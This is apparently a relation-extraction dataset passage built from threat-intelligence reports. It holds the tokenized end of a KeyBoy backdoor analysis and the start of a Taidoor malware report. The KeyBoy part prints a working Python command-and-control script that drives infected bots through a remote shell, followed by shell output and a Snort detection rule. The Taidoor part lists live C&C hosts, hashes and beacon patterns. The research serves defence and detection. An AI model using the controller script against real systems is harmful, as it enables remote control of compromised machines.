"82", "54", "1a"], ["d0"], ["c2", "87", "38", "a1", "20", "82", "b0", "19", "eb", "|.&", ".."], ["T", "....", "8", "."], ["...."], ["|", "00000040", "b0", "54", "b0", "19", "1a", "00", "|.T", "....", "|"], ["At", "the", "time", "of", "the", "analysis", "all", "the", "C&C", "servers", "were", "not", "responding", ",", "we", "started", "reverse", "engineering", "the", "communication", "protocol", "and", "noticed", "that", "it", "simply", "used", "a", "multiply", "with", "0x69", "to", "encode", "the", "traffic", "sent", "to", "the", "controllers", "."], ["You", "can", "easily", "decode", "the", "content", "of", "the", "payload", "with", "the", "following", "Python", "snippet", ":"], ["The", "previous", "packet", "decodes", "to", "the", "following", ":", "$", "login$", "LAB", "192.168.56.101"], ["MyUser", "2013/06/06", "23:56:24"], ["Proxy", "20130401"], ["While", "reverse", "engineering", "the", "backdoor", "we", "noticed", "that", "the", "malware", "expects", "the", "following", "messages", "from", "the", "C&C", "server", "it", "contacts", ":", "Sysinfo", "FileManager", "Download"], ["UploadFileOk", "Shell"], ["Intrigued", "by", "its", "capabilities", ",", "we", "started", "reconstructing", "the", "communication", "protocol", "and", "practically", "building", "a", "tool", "that", "would", "operate", "just", "like", "the", "original", "controller", "used", "by", "the", "attackers", "."], ["The", "following", "is", "a", "preliminary", "Python", "script", "that", "implements", "the", "protocol", "used", "by", "the", "malware", "and", "allows", "you", "to", "interact", "with", "it", ":", "1", "."], ["2", "."], ["3", "."], ["4", "."], ["5", "."], ["6", "."], ["7", "."], ["8", "."], ["9", "."], ["import", "sys", "10", ".", "import", "socket", "11", "."], ["import", "select", "12", "."], ["13", "."], ["14", "."], ["def", "decode(x", "):", "15", "."], ["return", "''", ".join([chr((ord(i)*0xd9)&0xff", ")", "for", "i", "in", "x", "]", ")", "16", "."], ["17", "."], ["18", "."], ["def", "encode(x", "):", "19", "."], ["return", "''", ".join([chr((ord(i)*0x93)&0xff", ")", "for", "i", "in", "x", "]", ")", "20", "."], ["21", "."], ["22", "."], ["def", "main", "(", "):", "23", "."], ["s", "=", "socket.socket(socket", "."], ["AF_INET", ",", "socket", "."], ["SOCK_STREAM", ")", "24", "."], ["s.setsockopt(socket", "."], ["SOL_SOCKET", ",", "socket", "."], ["SO_REUSEADDR", ",", "1", ")", "25", "."], ["s.bind((\"0.0.0.0", "\"", ",", "443", ")", ")"], ["26", "."], ["s.listen(1", ")"], ["27", "."], ["28", "."], ["29", "."], ["print", "\"", "[", "*", "]", "C&C", "Running", "on", "0.0.0.0:443", "\"", "30", "."], ["31", "."], ["32", ".", "while", "True", ":", "33", ".", "s2", ",", "ca", "=", "s.accept", "(", ")", "34", "."], ["print", "\"", "[", "+", "]", "New", "client", "connected", ":", "\"", ",", "ca", "35", "."], ["36", "."], ["while", "True", ":", "37", "."], ["dec", "=", "\"", "\"", "38", "."], ["rlist", ",", "wlist", ",", "xlist", "=", "select.select([s2", ",", "]", ",", "[", "]", ",", "[", "]", ",", "10", ")", "39", "."], ["while", "rlist", ":", "40", "."], ["data", "=", "s2.recv(2048", ")", "41", "."], ["if", "not", "data", ":", "break", "42", "."], ["43", "."], ["44", "."], ["dec", "=", "decode(data", ")", "45", "."], ["print", "dec", "46", "."], ["rlist", ",", "wlist", ",", "xlist", "=", "select.select([s2", ",", "]", ",", "[", "]", ",", "[", "]", ",", "2", ")", "47", "."], ["48", "."], ["49", "."], ["if", "dec.startswith(\"$login$", "\"", "):", "50", "."], ["print", "\"", "[", "+", "]", "Authenticating", "on", "the", "bot", "\"", "51", "."], ["s2.send(encode(\"login_OK\")+", "\"", "\\x00", "\"", ")", "52", "."], ["s2.send(encode(\"Refresh\")+", "\"", "\\x00", "\"", ")", "53", "."], ["elif", "dec.startswith(\"OnLine", "\"", "):", "54", "."], ["55", "."], ["s2.send(encode(\"test\")+", "\"", "\\x00", "\"", ")", "else", ":", "56", "."], ["cmd", "=", "raw_input(\"shell", ">", "\"", ")", ".strip"], ["(", ")", "57", "."], ["s2.send(encode(cmd)+\"\\x00", "\"", ")", "58", "."], ["59", "."], ["60", "."], ["s2.close", "(", ")", "61", "."], ["62", "."], ["63", "."], ["s.close", "(", ")", "64", "."], ["return", "0", "65", "."], ["66", "."], ["67", "."], ["if", "_", "_", "name", "_", "_", "=", "=", "\"", "_", "_", "main", "_", "_", "\"", ":", "68", "."], ["try", ":", "sys.exit(main", "(", ")", ")"], ["69", "."], ["except", "KeyboardInterrupt", ":", "pass"], ["We", "then", "launched", "this", "script", "and", "redirected", "the", "traffic", "coming", "from", "a", "system", "infected", "with", "KeyBoy", "and", "took", "control", "of", "it", "."], ["Here", "you", "can", "see", "the", "bot", "beaconing", "in", "and", "requiring", "for", "authentication", "(", "funny", "enough", "the", "password", "is", "\"", "test", "\"", ",", "while", "the", "Indian", "sample", "uses", "\"", "dns.com", "\"", "):"], ["[", "*", "]", "C&C", "Running", "on", "0.0.0.0:443"], ["[", "+", "]", "New", "client", "connected", ":", "(", "'", "192.168.56.110", "'", ",", "1443", ")"], ["$", "login$", "LAB", "192.168.56.110", "MyUser", "2013/06/07", "02:18:35"], ["Proxy", "20130401"], ["[", "+", "]", "Authenticating", "on", "the", "bot", "OnLine"], ["Pw_OK"], ["When", "the", "authentication", "is", "confirmed", ",", "we", "are", "prompted", "with", "a", "shell", "through", "which", "we", "can", "interact", "in", "real", "-", "time", "with", "the", "bot", "."], ["The", "messages", "we", "previously", "identified", "represent", "the", "actual", "commands", "that", "can", "be", "sent", "to", "the", "bot", ":", "Sysinfo", ":", "returns", "detailed", "information", "on", "the", "computer", "(", "pretty", "much", "the", "output", "of", "systeminfo", ")", ";", "the", "bot", "will", "respond", "with", "a", "message", "with", "the", "header", "$", "sysinfo$.", "FileManager", ":", "interact", "with", "all", "the", "disks", "available", "on", "the", "victim", "system", ";", "the", "bot", "will", "respond", "with", "a", "message", "with", "the", "header", "$", "fileManager$.", "Download", ":", "download", "a", "file", "from", "the", "compromised", "system", ";", "the", "bot", "will", "respond", "with", "a", "message", "with", "the", "header", "$", "fileDownload$."], ["UploadFileOk", ":", "upload", "a", "file", "to", "the", "compromised", "system", ";", "the", "bot", "will", "respond", "with", "a", "message", "with", "the", "header", "$", "fileUpload$."], ["Most", "interestingly", "the", "command", "Shell", "spawns", "a", "Windows", "command", "shell", "that", "we", "can", "control", "remotely", ":", "shell", ">", "Shell", "$", "shell$", "Microsoft", "Windows", "XP"], ["[", "Version", "5.1.2600", "]"], ["(", "C", ")", "Copyright", "1985", "-", "2001", "Microsoft", "Corp."], ["C:\\WINDOWS\\system32", ">", "shell", ">", "tasklist", "$", "shell$", "tasklist", "$", "shell$", "Image", "Name", "PID", "Session", "Name", "Session", "#", "Mem", "Usage", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "="], ["System", "Idle", "Process", "0"], ["Console", "0", "System", "4", "Console", "smss.exe", "368", "Console", "0", "388", "K", "csrss.exe", "584", "Console", "0", "3,740", "K", "winlogon.exe", "0", "28", "K", "236", "K", "608", "Console", "services.exe", "0", "652", "Console", "lsass.exe", "0", "664", "Console", "VBoxService.exe", "4,312", "K", "0", "3,368", "K"], ["6,152", "K", "820", "Console", "0", "3,092", "K", "svchost.exe", "864", "Console", "0", "4,696", "K", "svchost.exe", "952", "Console", "0", "4,252", "K", "svchost.exe", "1044", "Console", "0", "20,424", "K", "svchost.exe", "1100", "Console", "0", "3,584", "K", "svchost.exe", "1160", "Console", "0", "4,268", "K", "spoolsv.exe", "1428", "Console", "0", "4,996", "K", "explorer.exe", "1656", "Console", "0", "29,944", "K", "VBoxTray.exe", "1820", "Console", "GrooveMonitor.exe", "ctfmon.exe", "jqs.exe", "1868", "Console", "0", "2040", "Console", "0", "248", "Console", "1380", "Console", "3,620", "K", "0", "1888", "Console", "vmware-usbarbitrator.exe"], ["alg.exe", "0", "0", "4,340", "K", "3,148", "K", "1,396", "K", "0"], ["3,440", "K", "3,180", "K", "wscntfy.exe", "1692", "Console", "0", "1,804", "K", "wuauclt.exe", "1116", "Console", "0"], ["6,568", "K", "svchost.exe", "796", "Console", "0", "4,088", "K", "cmd.exe", "480", "Console", "0", "2,624", "K", "tasklist.exe", "724", "Console", "0", "4,068", "K", "wmiprvse.exe", "1256", "Console", "0", "5,544", "K", "C:\\WINDOWS\\system32", ">"], ["While", "the", "interaction", "with", "the", "bots", "could", "also", "be", "scripted", ",", "it", "might", "be", "plausible", "that", "the", "operators", "of", "these", "intrusions", "might", "be", "interacting", "with", "their", "targets", "exclusively", "manually", "to", "collect", "different", "data", "depending", "on", "each", "individual", "they", "infected", "and", "the", "goals", "they", "had", "set", "for", "the", "attack", "."], ["Detecting", "Infections"], ["While", "these", "are", "clearly", "not", "widespread", "attacks", "and", ",", "as", "in", "any", "other", "targeted", "attack", "case", ",", "we", "should", "not", "create", "alarmism", "for", "threats", "that", "are", "likely", "irrelevant", "for", "the", "majority", "of", "organizations", ",", "we", "want", "to", "share", "a", "few", "indicators", "that", "might", "help", "identify", "infections", "or", "assist", "in", "further", "research", "by", "whoever", "is", "interested", "in", "this", "campaign", "."], ["Firstly", ",", "thanks", "to", "the", "fixed", "patterns", "used", "by", "the", "malware", "in", "the", "authentication", "procedure", ",", "we", "can", "detect", "outbound", "traffic", "from", "infected", "hosts", "with", "the", "following", "simple", "Snort", "rule", ":", "alert", "tcp", "$", "HOME_NET", "any", "-", ">", "$", "EXTERNAL_NET", "any", "(", "msg:\"KeyBoy", "Backdoor", "Login", "\"", ";", "flow", ":", "to_server", ";", "content:\"|c4", "4c", "87", "3f", "11", "1e", "c4", "1a|", "\"", ";", "depth:8", ";", "sid:1000001", ";", "rev:1", ";", "classtype", ":", "trojan", "-", "activity", ";", "reference", ":", "url", ",", "community.rapid7.com", "/", "community", "/", "infosec", "/", "blog/2013/06/07", "/", "keyboy", "-", "tar", "geted", "-", "attacksagainst", "-", "vietnam", "-", "and", "-", "india", ")"], ["The", "simplest", "way", "to", "identify", "an", "infection", "on", "a", "given", "Windows", "system", ",", "is", "just", "to", "look", "for", "the", "existence", "of", "the", "file", "C:\\WINDOWS\\system32\\CREDRIVER.dll", "or", "of", "a", "service", "called", "MdAdum", "."], ["We", "also", "created", "a", "couple", "of", "Yara", "rules", "that", "you", "can", "use", "to", "scan", "your", "systems", "your", "collection", "of", "malware", "samples", "to", "identify", "copies", "of", "KeyBoy", ":", "Conclusions", "Not", "a", "day", "passes", "by", "without", "hearing", "of", "someone", "hit", "by", "a", "targeted", "attack", "."], ["Recently", "the", "growth", "of", "amount", "and", "scale", "of", "targeted", "attacks", "has", "come", "to", "the", "point", "were", "they", "are", "starting", "to", "look", "more", "like", "opportunistic", "carpet", "bombings", "rather", "than", "ninja", "strikes", "."], ["It", "'s", "common", "to", "observe", "attacks", "pulled", "off", "successfully", "without", "any", "particular", "sophistication", "in", "place", ",", "including", "the", "incidents", "described", "in", "this", "post", "."], ["It", "'s", "also", "getting", "quite", "difficult", "to", "attribute", "the", "attacks", "to", "any", "state", "-", "sponsored", "unit", ",", "both", "because", "there", "'s", "a", "generic", "lack", "of", "strong", "evidence", "in", "such", "incidents", "(", "which", "is", "why", "we", "refrained", "from", "making", "any", "statement", "on", "the", "origin", "of", "these", "intrusions", ")", "but", "frankly", "also", "because", "almost", "anybody", "could", "operate", "such", "campaigns", "and", "be", "reasonably", "successful", "."], ["The", "only", "differentiation", "between", "actors", "at", "this", "point", "exclusively", "relies", "on", "identifying", "the", "motivations", "and", "the", "context", "."], ["Beware", "though", ",", "just", "because", "these", "attacks", "are", "conceptually", "targeted", ",", "it", "does", "n't", "necessarily", "mean", "that", "they", "should", "have", "a", "higher", "priority", "than", "any", "other", "threat", "on", "your", "security", "program", "."], ["Our", "suggestion", "remains", "the", "same", ":", "identify", "your", "core", "assets", ",", "recognize", "the", "most", "impactful", "threats", "to", "such", "assets", "and", "inform", "and", "protect", "yourself", "accordingly", "."], ["This", "research", "was", "brought", "to", "you", "by", "Claudio", "Guarnieri", "and", "Mark", "Schloesser", "from", "Rapid7", "Labs", "."]]}, {"vertexSet": [[{"name": "Taidoor", "pos": [9, 10], "sent_id": 0, "type": "Malware"}], [{"name": "September 06, 2013", "pos": [11, 15], "sent_id": 0, "type": "Time"}], [{"name": "Taidoor", "pos": [1, 2], "sent_id": 2, "type": "Malware"}], [{"name": "Taiwan", "pos": [18, 19], "sent_id": 3, "type": "ExploitTargetObject"}], [{"name": "spear-phishing email", "pos": [11, 15], "sent_id": 4, "type": "Email"}], [{"name": "2008", "pos": [7, 8], "sent_id": 6, "type": "Time"}], [{"name": "Taidoor", "pos": [13, 14], "sent_id": 7, "type": "Malware"}], [{"name": "2011", "pos": [6, 7], "sent_id": 8, "type": "Time"}], [{"name": "2012", "pos": [8, 9], "sent_id": 8, "type": "Time"}], [{"name": "Taidoor", "pos": [19, 20], "sent_id": 8, "type": "Malware"}], [{"name": "Taidoor", "pos": [0, 1], "sent_id": 9, "type": "Malware"}], [{"name": "Taidoor", "pos": [4, 5], "sent_id": 15, "type": "Malware"}], [{"name": "Taidoor", "pos": [1, 2], "sent_id": 17, "type": "Malware"}], [{"name": "Taidoor", "pos": [4, 5], "sent_id": 18, "type": "Malware"}], [{"name": "2008", "pos": [18, 19], "sent_id": 19, "type": "Time"}], [{"name": "GET /[5 characters].php?id=[6 numbers][12 characters/numbers]", "pos": [6, 14], "sent_id": 20, "type": "Indicator"}], [{"name": "Taidoor", "pos": [5, 6], "sent_id": 25, "type": "Malware"}], [{"name": "be1d972819e0c5bf80bf1691cc563400", "pos": [5, 6], "sent_id": 26, "type": "MD5"}], [{"name": "CVE-2012-0158", "pos": [17, 20], "sent_id": 26, "type": "Vulnerability"}], [{"name": "XOR-encoded with the key \"0x02\" or \"0x03\"", "pos": [7, 20], "sent_id": 28, "type": "Obfuscation"}], [{"name": "tw.myblog.yahoo.com", "pos": [2, 3], "sent_id": 39, "type": "Indicator"}], [{"name": "RC4 cipher", "pos": [24, 26], "sent_id": 40, "type": "Obfuscation"}], [{"name": "asdfasdf", "pos": [10, 11], "sent_id": 41, "type": "Obfuscation"}], [{"name": "Taidoor", "pos": [17, 18], "sent_id": 42, "type": "Malware"}], [{"name": "dropper", "pos": [5, 6], "sent_id": 43, "type": "Dropper"}], [{"name": "Taidoor", "pos": [10, 11], "sent_id": 43, "type": "Malware"}], [{"name": "roudan.serveftp.com", "pos": [3, 4], "sent_id": 44, "type": "Indicator"}], [{"name": "69.95.218.31", "pos": [5, 6], "sent_id": 44, "type": "Address"}], [{"name": "mac.gov.hpc.tw", "pos": [8, 9], "sent_id": 44, "type": "Indicator"}], [{"name": "120.50.40.145", "pos": [10, 11], "sent_id": 44, "type": "Address"}], [{"name": "/[file name].jsp?[2 random characters]=[6 random characters][encrypted MAC address]", "pos": [5, 14], "sent_id": 54, "type": "Indicator"}], [{"name": "b0fd4d5fb6d8acb1ccfb54d53c08f11f", "pos": [11, 12], "sent_id": 55, "type": "MD5"}], [{"name": "Taidoor", "pos": [20, 21], "sent_id": 55, "type": "Malware"}], [{"name": "d9940a3da42eb2bb8e19a84235d86e91", "pos": [36, 37], "sent_id": 55, "type": "MD5"}], [{"name": "c4de3fea790f8ff6452016db5d7aa33f", "pos": [43, 44], "sent_id": 55, "type": "MD5"}], [{"name": "Taidoor", "pos": [7, 8], "sent_id": 56, "type": "MD5"}], [{"name": "Taidoor", "pos": [3, 4], "sent_id": 57, "type": "MD5"}], [{"name": "Taidoor", "pos": [16, 17], "sent_id": 58, "type": "Malware"}], [{"name": "Taiwan", "pos": [16, 17], "sent_id": 59, "type": "ExploitTargetObject"}], [{"name": "Taleret", "pos": [13, 14], "sent_id": 62, "type": "MalwareFamily"}], [{"name": "Taidoor", "pos": [22, 23], "sent_id": 62, "type": "Malware"}], [{"name": "samples", "pos": [3, 4], "sent_id": 63, "type": "Malware"}], [{"name": "6cd1bf0e8adcc7208b82e1506efdba8d", "pos": [7, 8], "sent_id": 63, "type": "MD5"}], [{"name": "525fd346b9511a84bbe26eb47b845d89", "pos": [9, 10], "sent_id": 63, "type": "MD5"}], [{"name": "5c887a31fb4713e17c5dda9d78aab9fe", "pos": [11, 12], "sent_id": 63, "type": "MD5"}], [{"name": "RC4 cipher", "pos": [17, 19], "sent_id": 64, "type": "Obfuscation"}], [{"name": "c37f12a0", "pos": [5, 6], "sent_id": 65, "type": "Obfuscation"}], [{"name": "opp.gov.taiwans.tw", "pos": [11, 12], "sent_id": 66, "type": "Indicator"}], [{"name": "nscnet.gov.medicare.tw", "pos": [12, 13], "sent_id": 66, "type": "Indicator"}], [{"name": "mac.gov.skies.tw", "pos": [13, 14], "sent_id": 66, "type": "Indicator"}], [{"name": "klserver.servehttp.com", "pos": [14, 15], "sent_id": 66, "type": "Indicator"}], [{"name": "kllserver.serveftp.com", "pos": [15, 16], "sent_id": 66, "type": "Indicator"}], [{"name": "202.142.153.154", "pos": [0, 1], "sent_id": 67, "type": "Address"}], [{"name": "80.149.239.139", "pos": [1, 2], "sent_id": 67, "type": "Address"}], [{"name": "202.142.172.131", "pos": [2, 3], "sent_id": 67, "type": "Address"}], [{"name": "www.facebook.trickip.NET", "pos": [3, 6], "sent_id": 67, "type": "Indicator"}], [{"name": "www.braintrust.AlmostMy.COM", "pos": [6, 11], "sent_id": 67, "type": "Indicator"}], [{"name": "Taidoor", "pos": [2, 3], "sent_id": 68, "type": "Malware"}], [{"name": "Taiwan", "pos": [12, 13], "sent_id": 68, "type": "ExploitTargetObject"}], [{"name": "mac.gov.hpc.tw", "pos": [25, 26], "sent_id": 68, "type": "Indicator"}], [{"name": "Taidoor", "pos": [27, 28], "sent_id": 68, "type": "Malware"}], [{"name": "mac.gov.skies.tw", "pos": [30, 31], "sent_id": 68, "type": "Indicator"}], [{"name": "Taleret", "pos": [32, 33], "sent_id": 68, "type": "Malware"}], [{"name": "Taidoor", "pos": [1, 2], "sent_id": 70, "type": "Malware"}], [{"name": "2008", "pos": [11, 12], "sent_id": 70, "type": "Time"}], [{"name": "Yahoo Blogs", "pos": [11, 13], "sent_id": 71, "type": "MalwareCharacteristics"}], [{"name": "Taidoor", "pos": [19, 20], "sent_id": 71, "type": "Malware"}]], "labels": [{"r": "P33", "h": 2, "t": 5, "evidence": [2, 6]}, {"r": "P33", "h": 13, "t": 14, "evidence": [18, 19]}, {"r": "P21", "h": 15, "t": 13, "evidence": [18, 20]}, {"r": "P7", "h": 16, "t": 18, "evidence": [25, 26]}, {"r": "P21", "h": 17, "t": 16, "evidence": [25, 26]}, {"r": "P13", "h": 16, "t": 19, "evidence": [25, 28]}, {"r": "P21", "h": 20, "t": 16, "evidence": [25, 39]}, {"r": "P13", "h": 23, "t": 21, "evidence": [40, 42]}, {"r": "P13", "h": 23, "t": 22, "evidence": [41, 42]}, {"r": "P21", "h": 26, "t": 24, "evidence": [43, 44]}, {"r": "P21", "h": 28, "t": 24, "evidence": [43, 44]}, {"r": "P28", "h": 24, "t": 27, "evidence": [43, 44]}, {"r": "P28", "h": 24, "t": 29, "evidence": [43, 44]}, {"r": "P21", "h": 30, "t": 25, "evidence": [43, 54]}, {"r": "P21", "h": 33, "t": 32, "evidence": [55]}, {"r": "P21", "h": 34, "t": 32, "evidence": [55]}, {"r": "P21", "h": 31, "t": 32, "evidence": [55]}, {"r": "P16", "h": 39, "t": 41, "evidence": [62, 63]}, {"r": "P21", "h": 42, "t": 41, "evidence": [63]}, {"r": "P21", "h": 44, "t": 41, "evidence": [63]}, {"r": "P21", "h": 43, "t": 41, "evidence": [63]}, {"r": "P13", "h": 41, "t": 45, "evidence": [63, 64]}, {"r": "P13", "h": 41, "t": 46, "evidence": [63, 65]}, {"r": "P21", "h": 47, "t": 62, "evidence": [66, 68]}, {"r": "P21", "h": 48, "t": 62, "evidence": [66, 68]}, {"r": "P21", "h": 50, "t": 62, "evidence": [66, 68]}, {"r": "P21", "h": 49, "t": 62, "evidence": [66, 68]}, {"r": "P21", "h": 51, "t": 62, "evidence": [66, 68]}, {"r": "P28", "h": 62, "t": 52, "evidence": [67, 68]}, {"r": "P28", "h": 62, "t": 53, "evidence": [67, 68]}, {"r": "P28", "h": 62, "t": 54, "evidence": [67, 68]}, {"r": "P21", "h": 55, "t": 62, "evidence": [67, 68]}, {"r": "P21", "h": 56, "t": 62, "evidence": [67, 68]}, {"r": "P33", "h": 63, "t": 64, "evidence": [70]}, {"r": "P13", "h": 66, "t": 65, "evidence": [71]}], "title": "201309FireEyeTaidoor", "sents": [["Menu", "Home", "FireEye", "Blogs", "Threat", "Research", "Evasive", "Tactics", ":", "Taidoor", "Share", "September", "06", ",", "2013", "|"], ["By", "Nart", "Villeneuve", ",", "Thoufique", "Haq", ",", "Ned", "Moran", "|", "Threat", "Intelligence", ",", "Threat", "Research"], ["The", "Taidoor", "malware", "has", "been", "used", "in", "many", "ongoing", "cyber", "espionage", "campaigns", "."], ["Its", "victims", "include", "government", "agencies", ",", "corporate", "entities", ",", "and", "think", "tanks", ",", "especially", "those", "with", "interests", "in", "Taiwan", "."], ["[", "1", "]", "In", "a", "typical", "attack", ",", "targets", "receive", "a", "spear", "-", "phishing", "email", "which", "encourages", "them", "to", "open", "an", "attached", "file", "."], ["If", "opened", "on", "a", "vulnerable", "system", ",", "malware", "is", "silently", "installed", "on", "the", "target", "\u2019s", "computer", "while", "a", "decoy", "document", "with", "legitimate", "content", "is", "opened", "that", "is", "intended", "to", "alleviate", "any", "suspicions", "the", "target", "may", "have", "."], ["Taidoor", "has", "been", "successfully", "compromising", "targets", "since", "2008", ",", "and", "continues", "to", "be", "active", "today", "."], ["Despite", "being", "around", "for", "a", "long", "time", "\u2013", "and", "quite", "well", "known", "\u2013", "Taidoor", "is", "a", "constantly", "evolving", ",", "persistent", "threat", "."], ["We", "observed", "significant", "tactical", "changes", "in", "2011", "and", "2012", ",", "when", "the", "malicious", "email", "attachments", "did", "not", "drop", "the", "Taidoor", "malware", "directly", ",", "but", "instead", "dropped", "a", "\u201c", "downloader", "\u201d", "that", "then", "grabbed", "the", "traditional"], ["Taidoor", "malware", "from", "the", "Internet", "."], ["[", "2", "]"], ["Recently", ",", "we", "observed", "a", "new", "variant", "of", "Taidoor", ",", "which", "was", "used", "in", "targeted", "attacks", "."], ["It", "has", "evolved", "in", "two", "ways", "."], ["Instead", "of", "downloading", "the", "traditional", "Taidoor", "malware", "from", "a", "command", "-", "and", "-", "control", "(", "CnC", ")", "server", ",", "the", "\u201c", "downloader", "\u201d", "reaches", "out", "to", "Yahoo", "Blogs", "and", "retrieves", "encrypted", "text", "from", "blog", "posts", "."], ["When", "decrypted", "by", "the", "\u201c", "downloader", "\u201d", ",", "this", "text", "is", "actually", "a", "modified", "version", "of", "the", "traditional", "Taidoor", "malware", "."], ["This", "new", "version", "of", "Taidoor", "maintains", "similar", "behavior", ",", "but", "has", "been", "changed", "enough", "to", "avoid", "common", "network", "detection", "signatures", "."], ["Traditional", "Taidoor", "Malware"], ["The", "Taidoor", "malware", "is", "traditionally", "delivered", "as", "an", "email", "attachment", "."], ["If", "opened", ",", "the", "Taidoor", "malware", "is", "dropped", "onto", "the", "target", "\u2019s", "system", ",", "and", "starts", "to", "beacon", "to", "a", "CnC", "server", "."], ["Taidoor", "connects", "to", "its", "CnCs", "using", "HTTP", ",", "and", "the", "\u201c", "GET", "\u201d", "request", "has", "been", "consistent", "since", "2008", "."], ["It", "follows", "a", "simple", "pattern", ":", "GET", "/[5", "characters].php?id=[6", "numbers][12", "characters", "/", "numbers", "]"], ["The", "last", "set", "of", "12", "characters", "is", "actually", "the", "encrypted", "MAC", "address", "of", "the", "compromised", "computer", "."], ["The", "values", "of", "the", "MAC", "address", "are", "incremented", "by", "1", ",", "and", "this", "is", "used", "as", "an", "RC4", "key", "to", "encrypt", "the", "data", "that", "is", "passed", "between", "the", "compromised", "computer", "and", "its", "CnC", "server", "."], ["The", "New", "Taidoor"], ["In", "the", "past", ",", "other", "APT", "campaigns", "have", "used", "blog", "hosting", "platforms", "as", "a", "mechanism", "to", "transmit", "CnC", "server", "information", "to", "compromised", "targets", "."], ["[", "3", "]", "Attackers", "using", "Taidoor", "have", "leveraged", "this", "model", "as", "well", "."], ["We", "analyzed", "a", "sample", "(", "be1d972819e0c5bf80bf1691cc563400", ")", "that", "when", "opened", "exploits", "a", "vulnerability", "in", "Microsoft", "Office", "(", "CVE-2012", "-", "0158", ")", "to", "drop", "malware", "on", "the", "target", "\u2019s", "computer", "."], ["The", "decoy", "document", "contains", "background", "information", "on", "trade", "liberalization", "between", "the", "People", "\u2019s", "Republic", "of", "China", "(", "PRC", ")", "and", "Taiwan", "."], ["The", "various", "strings", "in", "the", "file", "are", "XOR", "-", "encoded", "with", "the", "key", "\"", "0x02", "\"", "or", "\"", "0x03", "\"", "."], ["This", "malware", "is", "a", "simple", "\u201c", "downloader", "\u201d", "that", ",", "instead", "of", "connecting", "to", "a", "CnC", "server", ",", "connects", "to", "a", "Yahoo", "Blog", "and", "downloads", "the", "contents", "of", "a", "blog", "post", "."], ["GET", "/jw!JRkdqkKGAh6MPj9MlwbK6iMgScEHTTP/1.1"], ["Accept", ":", "/"], ["Accept", "-", "Language", ":"], ["enus"], ["User", "-", "Agent", ":", "Mozilla/4.0", "(", "compatible", ";", "MSIE", "8.0", ";", "Windows", "NT", "5.1", ";", "Trident/4.0", ";", ".NET"], ["CLR", "2.0.50727", ";", ".NET"], ["CLR", "3.0.04506.648", ";", ".NET"], ["CLR", "3.5.21022", ";", "InfoPath.2", ")"], ["Accept", "-", "Encoding", ":", "gzip", ",", "deflate"], ["Host", ":", "tw.myblog.yahoo.com", "Connection", ":", "Keep", "-", "Alive"], ["The", "content", "of", "the", "blog", "post", "between", "the", "markers", "\u201c", "ctxugfbyyxyyyxyy", "\u201d", "and", "\u201c", "yxyyyxyyctxugfby", "\u201d", "is", "encoded", "with", "base64", "and", "encrypted", "using", "the", "RC4", "cipher", "."], ["The", "encryption", "key", ",", "which", "we", "discovered", "to", "be", "\"", "asdfasdf", "\"", ",", "is", "also", "present", "in", "the", "contents", "of", "the", "base64", "blog", "data", "in", "an", "encrypted", "form", "."], ["The", "decrypted", "content", "of", "the", "blog", "post", "is", "a", "DLL", "file", "\u2013", "that", "is", "in", "fact", "the", "Taidoor", "malware", "."], ["After", "the", "first", "-", "stage", "dropper", "downloads", "and", "decrypts", "the", "Taidoor", "malware", ",", "it", "then", "begins", "to", "connect", "to", "two"], ["CnC", "servers", ":", "roudan.serveftp.com", "(", "69.95.218.31", ")", "and", "mac.gov.hpc.tw", "(", "120.50.40.145", ")", "."], ["However", ",", "the", "network", "traffic", "(", "its", "\u201c", "callback", "\u201d", ")", "has", "been", "modified", "from", "the", "traditional", "version", "."], ["GET", "/default.jsp?vx", "="], ["vsutnh191138F9744C", "HTTP/1.1", "User", "-", "Agent", ":", "Mozilla/4.0", "(", "compatible", ";", "MSIE", "8.0", ";", "Windows", "NT", "5.1", ";", "Trident/4.0", ";", ".NET"], ["CLR", "2.0.50727", ";", ".NET"], ["CLR", "3.0.4506.2152", ";", ".NET"], ["CLR", "3.5.30729", ")"], ["Host", ":", "mac.gov.hpc.tw:443"], ["Connection", ":", "Keep", "-", "Alive", "Cache", "-", "Control", ":", "nocache"], ["Rather", "than", "having", "\u201c", "[", "five", "characters].php", "\u201d", ",", "this", "new", "file", "path", "ends", "in", "\u201c", ".jsp", "\u201d", "and", "may", "have", "any", "of", "the", "following", "file", "names", ":", "process", "page", "default", "index", "user", "parse", "about", "security", "query", "login"], ["The", "new", "format", "is", ":", "/[file", "name].jsp?[2", "random", "characters]=[6", "random", "characters][encrypted", "MAC", "address", "]"], ["In", "addition", "to", "the", "use", "of", "other", "malicious", "Word", "documents", "(", "b0fd4d5fb6d8acb1ccfb54d53c08f11f", ")", ",", "we", "have", "also", "seen", "this", "new", "Taidoor", "variant", "distributed", "as", "a", "Windows", "ScreenSaver", "file", "(", ".scr", ")", "posing", "as", "a", "PDF", "(", "d9940a3da42eb2bb8e19a84235d86e91", ")", "or", "a", "Word", "document", "(", "c4de3fea790f8ff6452016db5d7aa33f", ")", "."], ["It", "remains", "unclear", "whether", "all", "of", "this", "Taidoor", "activity", "is", "related", "or", "different", "groups", "are", "using", "the", "same", "malware", "for", "different", "purposes", "."], ["The", "fact", "that", "Taidoor", "is", "not", "off", "-", "the", "-", "shelf", "malware", "that", "can", "simply", "be", "downloaded", "or", "purchased", "in", "the", "cybercrime", "underground", "suggests", "that", "all", "of", "this", "activity", "may", "be", "connected", "in", "some", "way", "."], ["So", "far", ",", "we", "have", "found", "only", "one", "large", "cluster", "of", "activity", "associated", "with", "this", "new", "Taidoor", "variant", "."], ["This", "cluster", ",", "which", "made", "use", "of", "Yahoo", "Blogs", ",", "appears", "to", "have", "targeted", "entities", "in", "Taiwan", "."], ["We", "found", "that", "traditional", "versions", "of", "Taidoor", "have", "also", "been", "using", "this", "infrastructure", "."], ["[", "4", "]", "Malware", "Connections"], ["We", "found", "that", "another", ",", "possibly", "related", ",", "malware", "family", "known", "as", "\u201c", "Taleret", "\u201d", "is", "using", "the", "same", "technique", "that", "this", "Taidoor", "variant", "has", "used", "."], ["We", "found", "that", "samples", "(", "such", "as", "6cd1bf0e8adcc7208b82e1506efdba8d", ",", "525fd346b9511a84bbe26eb47b845d89", "and", "5c887a31fb4713e17c5dda9d78aab9fe", ")", "connect", "to", "Yahoo", "Blogs", "in", "order", "to", "retrieve", 